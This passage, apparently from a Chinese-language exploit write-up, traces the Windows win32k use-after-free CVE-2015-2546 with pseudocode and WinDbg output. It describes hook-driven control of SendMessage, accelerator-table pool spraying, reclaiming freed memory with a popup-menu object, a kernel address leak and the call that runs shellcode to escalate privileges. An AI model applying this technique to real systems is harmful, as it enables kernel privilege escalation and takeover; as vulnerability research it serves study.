接下来，进入到消息钩子部分，主要处理的还是SendMessage异步处理时的消息，通过修改返回，最后达到漏洞调用位置，通过IDA
pro来跟踪一下MNMouseMove的执行流程，以及跟CVE-2015-2546有关的部分。
    void __stdcall xxxMNMouseMove(WCHAR UnicodeString, int a2, int a3)
    {
      ……
        if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 12) )
        {
          *(_DWORD *)(a2 + 8) = (signed __int16)a3;
          *(_DWORD *)(v5 + 12) = SHIWORD(v4);
          v6 = xxxMNFindWindowFromPoint(v3, (int)&UnicodeString, v4);// V6通过HOOK可控，这里的sendmessage是异步处理
          v7 = v6;                                  // v7可控
          ……
          if ( *(_DWORD *)(v5 + 16) == 1 )          // 这个外层if不一定会进来
          {
            if ( !v7 || v7 == -1 && *(_BYTE *)(*(_DWORD *)(v3 + 4) + 35) & 0x20 )// 判断返回值是0或者-1
              return;
            *(_DWORD *)(v5 + 16) = -1;
          }
          if ( v7 == -5 )                           // 当返回值是0xffffffb
          {
    ……
          }
          else                                      // 否则进入这里
          {
             ……
              v9 = *(_DWORD **)(v7 + 176);          // 获取tagPOPUPMENU的位置，偏移是+0B0h
             ……
              v10 = xxxSendMessage((PVOID)v7, -27, UnicodeString, 0);
              if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, -16, 0, 0) )
                xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置
经过分析，我们需要处理三处SendMessage的异步过程，第一处在FindWindowFromPoint，这个函数中会有一处SendMessage，通过异步过程执行钩子，但是我调试时发现在进入这个函数返回，但并没有执行钩子。
    kd> p
    win32k!xxxMNMouseMove+0x48:
    90669437 e862010000      call    win32k!xxxMNFindWindowFromPoint (9066959e)
    kd> p
    win32k!xxxMNMouseMove+0x4d:
    9066943c f7470400800000  test    dword ptr [edi+4],8000h
    kd> r eax
    eax=fea11430
    跟踪一下这个过程，我发现在进入SendMessage之前，有一处if语句判断，当这个if语句判断不通过的时候，不会进入SendMessage处理。
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x14:
    906695b2 8b470c          mov     eax,dword ptr [edi+0Ch]
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x17:
    906695b5 85c0            test    eax,eax
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x19:
    906695b7 746b            je      win32k!xxxMNFindWindowFromPoint+0x86 (90669624)
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x86:
    90669624 8b07            mov     eax,dword ptr [edi]
    kd> dd edi
    fde8da68  12a10008 fea38d58 fea11430 00000000
可以看到这里eax的值是edi+0ch对应的值，也就是0，对应伪代码v5变量值为0，也就是if语句判断没通过，跳转了。这样我们还需要重新看一下这个值，这个值来自于tagPopupMenu结构体，通过CVE-2014-4113和CVE-2015-2546的tagPopupMenu结构体做一个对比。
    kd> dt tagPOPUPMENU fde8da68//我们的Exploit中的结构体
       +0x004 spwndNotify      : 0xfea38d58 tagWND
       +0x008 spwndPopupMenu   : 0xfea11430 tagWND
       +0x00c spwndNextPopup   : (null) 
    kd> dt fde8da68 tagPOPUPMENU//CVE-2014-4113的结构体
       +0x004 spwndNotify      : 0xfea39de8 tagWND
       +0x008 spwndPopupMenu   : 0xfea12398 tagWND
       +0x00c spwndNextPopup   : 0xfea12578 tagWND
实际上，在通过TrackPopupMenu之后会调用MNLoop进入循环处理消息，而我们的exp中只有一个postmessage，于是我们增加到三个postmessage，再次调试跟踪。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e7:
    90669060 57              push    edi
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> r edi
    edi=fde8da68
       +0x004 spwndNotify      : 0xfea39d18 tagWND
       +0x008 spwndPopupMenu   : 0xfea11430 tagWND
       +0x00c spwndNextPopup   : 0xfea12698 tagWND
这样，我们就能够处理了，接下来利用三个钩子，分别处理三种消息的调用，这个调用过程和CVE-2014-4113相比差别还是比较大的。需要来看一下最关键的钩子该怎么用。首先我们要分析一下和漏洞利用最关键的函数xxxMNHideNextHierarchy，这个函数有一个参数。
    signed int __stdcall xxxMNHideNextHierarchy(int a1)
      v1 = *(_DWORD *)(a1 + 12);
      if ( v1 )
      {
        v2 = *(void **)(a1 + 12);
        if ( v2 != *(void **)(a1 + 28) )
          xxxSendMessage(v2, -28, 0, 0);//这里调用shellcode提权
这个参数a1直接影响到后面的提权，回到外层看一下这个a1从哪里来。
    v6 = xxxMNFindWindowFromPoint(v3, (int)&UnicodeString, v4);// V6通过HOOK可控，这里的sendmessage是异步处理
          v7 = v6;                                  // v7可控
          ……
          v9 = *(_DWORD **)(v7 + 176);          // 获取tagPOPUPMENU的位置，偏移是+0B0h
          if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, -16, 0, 0) )
                xxxMNHideNextHierarchy((int)v9);    // 漏洞触发关键位置
正是从MNFindWindowFromPoint而来，本来是一次轻松愉快的旅程，但是实际上在逻辑代码中，有一个地方导致了这次旅程血崩，就是：
    if ( IsWindowBeingDestroyed(v7) )
                return;
这个地方会对窗口的属性进行检查，也就是说，v7不能是一个任意值，比如是我们直接通过零页分配的shellcode的某个地址指针，如果可以的话，后面就会导致其他的利用了，因此这个值必须是一个窗口的值，因此我们用一种方法：
就是创建窗口A和窗口B，在这里通过异步调用，返回窗口B的值，这样后续处理中，就会将窗口B的tagMenu偏移+0B0h位置的值，也就是tagPopupMenu交给v9，那么随后在最后一个SendMessage中销毁窗口B，通过一些方法将销毁后的位置占位，因为后面没有进行判断，从而可以调用占位后的值。而通过分析xxxMNHideNextHierarchy，内层函数用的是tagPopupMenu->spwndNextPopup，因此，只要在占位时再控制这个值，为一个我们可控的值，最后就能在xxxMNHideNextHierarchy里的sendmessage完成最后一步提权了。
有了这个思路，我们就可以开始完成整个提权的工作，首先，我们需要创建一个正常的主窗口，然后我们利用CreateAcceleratorTable来创建大量的tagACCEL对象，加速键表是一个非常好的pool
spray的对象，因为它的大小是可控的，我们利用CreateAcceleratorTable创建对象，然后在Windbg里跟踪对象创建过程。
    kd> bp 13a1910 ".printf "Create Accelerator at: 0x%.08x\n",@eax;g;"
    breakpoint 0 redefined
    kd> bp 13a192d
    kd> g
    Create Accelerator at: 0xffb22c48
    Create Accelerator at: 0xfe7f4eb0
    Create Accelerator at: 0xfe9ef1d0
    Create Accelerator at: 0xfdf756c8
    Create Accelerator at: 0xffa30e28
    Create Accelerator at: 0xfdf73440
    Create Accelerator at: 0xffa020e0
    Create Accelerator at: 0xfe898cd0
    Create Accelerator at: 0xfdf81ab8
    Create Accelerator at: 0xffa2e0d0
    Create Accelerator at: 0xfe9fbd08
    Create Accelerator at: 0xfe8ff868
    Create Accelerator at: 0xfdfdab70
    Create Accelerator at: 0xfe9a4690
    Create Accelerator at: 0xfded3a70
    Create Accelerator at: 0xffa0ac88
    Create Accelerator at: 0xffaa6d90//这个位置创建了Accelerator，在后面这个位置被释放，tagPOPUPMENU会占用
    Create Accelerator at: 0xfe966c98
    Create Accelerator at: 0xfe8a4e88
    Create Accelerator at: 0xfdfdeb68
    Create Accelerator at: 0xfde9da70
    Create Accelerator at: 0xfe952528
    Create Accelerator at: 0xffa300d8
    Create Accelerator at: 0xfe5ffa70
可以看到，这里分配了大量的tagACCEL对象，上面代码注释部分的0xffaa6d90是我在后续过程中释放的其中一个tagACCEL对象，在后面需要每隔一个间隔释放一个tagACCEL对象，用DestroyAccelerator来将加速键表的对象释放掉。正如之前我所说，由于Accelerator
Table在申请时大小可控，我们申请的每一个tagACCEL对象要和tagPopupMenu相同大小。
之后，我们需要建立一个新的窗口，如之前我标红段落所述，由于之前的那处判断，导致我们不能直接构造fake
WND，而需要用一个窗口，这个主窗口需要包含弹出菜单，也就是tagPopupMenu，这样才能直接占位。
Windows给我们提供了一个非常有趣的窗口，类名为：#32768，这是Windows默认的包含弹出菜单的主窗口，也就是，这个类名为#32768调用CreateWindowsExW创建tagWND后，会自动生成tagPopupMenu。
    kd> p
    PoC+0x19ba:
    013a19ba 50              push    eax
    kd> r eax
    eax=005b0770//创建#32768的tagWND
    kd> dt win32k!_THRDESKHEAD 5b0770
       +0x000 h                : 0x000a0140 Void
       +0x004 cLockObj         : 4
       +0x008 pti              : 0xfe9edb80 tagTHREADINFO
       +0x00c rpdesk           : 0x8609a488 tagDESKTOP
       +0x010 pSelf            : 0xfea10770  "@???"//通过pself找到内核对象地址
    kd> dd fea10770+b0
    fea10820  ffaa6d90 00000000 00000000 00000000//ffaa6d90是tagPOPUPmenu，它占了之前Accelerator释放的坑
我们通过调用CreateWindowExW创建#32768的tagWND后，可以在偏移+0x10位置找到pSelf对象，泄露tagWND的内核对象地址，这样这个内核对象地址+0xb0位置存放的是tagPopupMenu，而这个值是ffaa6d90，正是我们之前释放的tagACCEL的地址。
直接通过!pool命令来看一下这个tagPopupMenu的占位情况。
    kd> !pool ffaa6d90
    Pool page ffaa6d90 region is Paged session pool
     ffaa6000 size:  8e0 previous size:    0  (Allocated)  Gla1
     ffaa68e0 size:   50 previous size:  8e0  (Allocated)  Ustm
     ffaa6930 size:   b8 previous size:   50  (Allocated)  Uspp
     ffaa69e8 size:   b8 previous size:   b8  (Allocated)  Uspp
     ffaa6aa0 size:  158 previous size:   b8  (Allocated)  UsDI
     ffaa6bf8 size:  158 previous size:  158  (Allocated)  UsDI
     ffaa6d50 size:   10 previous size:  158  (Allocated)  Glnk
     ffaa6d60 size:   18 previous size:   10  (Allocated)  Ggls